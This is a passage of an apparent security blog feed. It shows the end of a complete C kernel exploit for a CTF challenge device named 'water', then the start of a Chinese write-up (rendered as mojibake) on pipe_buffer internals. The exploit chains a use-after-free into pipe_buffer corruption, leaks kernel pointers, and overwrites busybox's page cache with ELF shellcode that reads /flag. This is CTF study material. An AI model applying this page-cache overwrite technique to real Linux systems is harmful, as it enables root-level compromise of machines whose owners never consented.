&amp;tmp);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_chunk</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">water_struct</span> <span class="hljs-title">tmp</span> =</span> &#123;<br>        .buf = <span class="hljs-literal">NULL</span>,<br>    &#125;;<br>    ioctl(fd_water, <span class="hljs-number">0x30</span>, &amp;tmp);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit_chunk</span><span class="hljs-params">(<span class="hljs-type">char</span> *data)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">water_struct</span> <span class="hljs-title">tmp</span> =</span> &#123;<br>        .buf = data,<br>    &#125;;<br>    ioctl(fd_water, <span class="hljs-number">0x50</span>, &amp;tmp);<br>&#125;<br><br><span class="hljs-type">char</span> temp_zero_buf[<span class="hljs-number">0x1000</span>];<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    save_status();<br>    bind_core(<span class="hljs-number">0</span>);<br>    fd_water = open(<span class="hljs-string">&quot;/dev/water&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span>(fd_water &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;Fail to open the device water!&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to create pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] first extend pipe pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM / <span class="hljs-number">2</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to extend %d pipe!&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] UAF...&quot;</span>);<br>    add_chunk(<span class="hljs-string">&quot;Eurus&quot;</span>);<br>    delete_chunk();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] second extend pipe pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = PIPE_SPRAY_NUM / <span class="hljs-number">2</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to extend %d pipe!&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] allocating pipe pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>    &#123;<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] edit one...&quot;</span>);<br>    edit_chunk(<span class="hljs-string">&quot;\x80&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for corruption...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>    &#123;<br>        <span class="hljs-type">char</span> a3_str[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">int</span> nr;<br><br>        <span class="hljs-built_in">memset</span>(a3_str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(a3_str));<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], a3_str, <span class="hljs-number">8</span>);<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(a3_str, <span class="hljs-string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i)<br>        &#123;<br>            orig_pid = nr;<br>            victim_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>, <br>                   victim_pid, orig_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(victim_pid == <span class="hljs-number">-1</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> snd_pipe_sz = <span class="hljs-number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="hljs-number">2</span> - <span class="hljs-number">40</span> - <span class="hljs-number">2</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free original pipe...&quot;</span>);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid)<br>        &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="hljs-number">8</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> <br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>, <br>           info_pipe_buf.page, info_pipe_buf.ops);<br><br>    <span class="hljs-keyword">if</span>((<span class="hljs-type">size_t</span>) info_pipe_buf.page &lt; <span class="hljs-number">0xffff000000000000</span> || (<span class="hljs-type">size_t</span>) info_pipe_buf.ops &lt; <span class="hljs-number">0xffffffff81000000</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to re-hit victim page!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);<br>    info_pipe_buf.page = (<span class="hljs-keyword">struct</span> page*)((<span class="hljs-type">size_t</span>) info_pipe_buf.page + <span class="hljs-number">0x40</span>);<br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>    &#123;<br>        <span class="hljs-type">char</span> a3_str[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">int</span> nr;<br>        <span class="hljs-built_in">memset</span>(a3_str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(a3_str));<br>        <span class="hljs-keyword">if</span>(i == orig_pid || i == victim_pid)<br>        &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], a3_str, <span class="hljs-number">8</span>);<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        <span class="hljs-keyword">if</span>(nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr)<br>        &#123;<br>            snd_orig_pid = nr;<br>            snd_vicitm_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, <br>                   snd_vicitm_pid, snd_orig_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(snd_vicitm_pid == <span class="hljs-number">-1</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-type">char</span> temp_buf[<span class="hljs-number">0x1000</span>];<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], temp_buf, <span class="hljs-number">0x60</span>);<br><br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], temp_zero_buf, <span class="hljs-number">96</span>*<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++)  write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br><br>    <span class="hljs-type">loff_t</span> offset = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> fd_busybox = open(<span class="hljs-string">&quot;/bin/busybox&quot;</span>, O_RDONLY);<br>    splice(fd_busybox, &amp;offset, pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">file_buf</span>;</span><br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], temp_buf, <span class="hljs-number">96</span>*<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++)  read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], &amp;file_buf, <span class="hljs-keyword">sizeof</span>(file_buf));<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[?] file_buf-&gt;page: \033[0m%p\n&quot;</span>, <br>           file_buf.page);<br><br>    file_buf.offset = <span class="hljs-number">0</span>;<br>    file_buf.len = <span class="hljs-number">0</span>;<br>    file_buf.flags = <span class="hljs-number">0x10</span>;<br><br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], temp_zero_buf, <span class="hljs-number">96</span>*<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++) write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;file_buf, <span class="hljs-keyword">sizeof</span>(file_buf));<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> elfcode[] = &#123;<br>        <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x97</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>,<br>        <span class="hljs-number">0x48</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x6a</span>,<br>        <span class="hljs-number">0x02</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0xff</span>,<br>        <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x5f</span>,<br>        <span class="hljs-number">0x99</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xEB</span><br>    &#125;;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], elfcode, <span class="hljs-keyword">sizeof</span>(elfcode));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li>page cache</li><li>VFS</li><li>pipe &amp; spliceæºç </li></ul>]]></content>
    
    
    <categories>
      
      <category>CVEs</category>
      
      <category>Linux Kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>cve</tag>
      
      <tag>pipe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023 å¼ºç½‘æ‹Ÿæ€ water-ker</title>
    <link href="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/"/>
    <url>/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/</url>
    
    <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡åœ¨æ¯”èµ›ä¸­å°è¯•åškernelé¢˜ï¼ˆè™½ç„¶æ²¡åšå‡ºæ¥ï¼‰ï¼Œå¤ç°æ¥å“©~</p><p>åŸºæœ¬ä¸Šæ˜¯æŠ„çš„<a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">D^3CTF2023 d3kcache</a>çš„expï¼Œå­¦ä¹ ä¸€ä¸‹è¿™ç§åˆ©ç”¨æ–¹æ³•</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/wjx.jpg" class title="wjx"><p><em>è™½ç„¶å·²ç»ä¸ç®—é€Ÿé€Ÿäº†ä½†æˆ‘è¿˜æ˜¯æ›´äº†(ãƒ»âˆ€ãƒ»(ãƒ»âˆ€ãƒ»(ãƒ»âˆ€ãƒ»</em>)*</p><span id="more"></span><h1 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h1><p>åœ¨pipeç³»ç»Ÿè°ƒç”¨ä¸­ç”³è¯·çš„ç»“æ„ä½“ï¼Œç”¨äºå­˜æ”¾pipeçš„æ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨alloc_pipe_infoå‡½æ•°ä¸­ä¼šç”³è¯·pipe_bufferï¼ˆé»˜è®¤16ï¼‰ä¸ªpipe_buffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>     GFP_KERNEL_ACCOUNT);<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨pipe_writeä¸­ä¼šç»™pipe_buffer-&gt;pageç”³è¯·ä¸€ä¸ªpage</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">pipe_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *from)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br><span class="hljs-keyword">for</span> (;;) &#123;<br><span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br><br><span class="hljs-keyword">if</span> (!page) &#123;<br>page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);<br><span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>ret = ret ? : -ENOMEM;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pipe-&gt;tmp_page = page;<br>&#125;<br><br>buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>buf-&gt;page = page;<br>buf-&gt;ops = &amp;anon_pipe_buf_ops;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (is_packetized(filp))<br>buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br><span class="hljs-keyword">else</span><br>buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>closeä¸€ä¸ªpipeä¼šåœ¨free_pipe_infoé‡Šæ”¾pipe_bufferï¼Œå¦‚æœä¸€ä¸ªbuf-&gt;pageçš„refä¸º0ä¼šåœ¨pipe_buf_releaseä¸­freeè¿™ä¸ªpage</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free_pipe_info</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; pipe-&gt;ring_size; i++) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> pipe-&gt;bufs + i;<br><span class="hljs-keyword">if</span> (buf-&gt;ops)<br>pipe_buf_release(pipe, buf);<br>&#125;<br><br><span class="hljs-keyword">if</span> (pipe-&gt;tmp_page)<br>__free_page(pipe-&gt;tmp_page);<br>kfree(pipe-&gt;bufs);<br>kfree(pipe);<br>&#125;<br></code></pre></td></tr></table></figure><p>F_SETPIPE_SZå¯ä»¥æ›´æ”¹pipe_bufferçš„å€¼è¾¾åˆ°ä»»æ„å¤§å°åˆ†é…çš„ç›®çš„ï¼Œåœ¨pipe_resize_ringå‡½æ•°ä¸­ä¼šç”³è¯·æ–°çš„pipe_bufferï¼Œå¤åˆ¶å†…å®¹å¹¶é‡Šæ”¾åŸæ¥çš„pipe_buffer</p><p>é‡æ–°åˆ†é…çš„å¤§å°æ˜¯2^order * 0x1000ï¼Œ2^orderå°±æ˜¯pipe_bufferæ•°ç»„çš„å¤§å°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 